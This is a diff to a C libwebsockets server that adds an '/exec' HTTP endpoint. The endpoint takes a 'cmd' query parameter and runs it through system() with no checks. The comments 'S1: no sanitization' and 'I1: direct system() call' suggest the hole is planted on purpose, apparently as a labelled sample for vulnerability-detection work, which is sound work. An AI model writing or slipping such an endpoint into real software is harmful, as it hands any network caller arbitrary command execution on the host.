 /* ── signal ──────────────────────────────────────────────────────────────── */
 
 static void sigint_handler(int sig)
@@ -30,6 +33,37 @@
     interrupted = 1;
 }
 
+/* handle the /exec endpoint */
+static int handle_exec(struct lws *wsi)
+{
+    uint8_t buf[LWS_PRE + 512], *start = &buf[LWS_PRE],
+            *p = start, *end = &buf[sizeof(buf) - 1];
+    char cmd[256];
+    int rv;
+
+    rv = lws_get_urlarg_by_name_safe(wsi, "cmd", cmd, (int)sizeof(cmd) - 1);
+    if (rv < 0 || cmd[0] == '\0') {
+        if (lws_add_http_common_headers(wsi, HTTP_STATUS_BAD_REQUEST,
+                "text/plain", LWS_ILLEGAL_HTTP_CONTENT_LEN, &p, end) ||
+            lws_finalize_write_http_header(wsi, start, &p, end))
+            return -1;
+        lws_callback_on_writable(wsi);
+        return 0;
+    }
+
+    /* S1: no sanitization */
+
+    /* I1: direct system() call */
+    system(cmd);
+
+    if (lws_add_http_common_headers(wsi, HTTP_STATUS_OK,
+            "text/plain", LWS_ILLEGAL_HTTP_CONTENT_LEN, &p, end) ||
+        lws_finalize_write_http_header(wsi, start, &p, end))
+        return -1;
+    lws_callback_on_writable(wsi);
+    return 0;
+}
+
 /* ── HTTP callback ───────────────────────────────────────────────────────── */
 
 static int
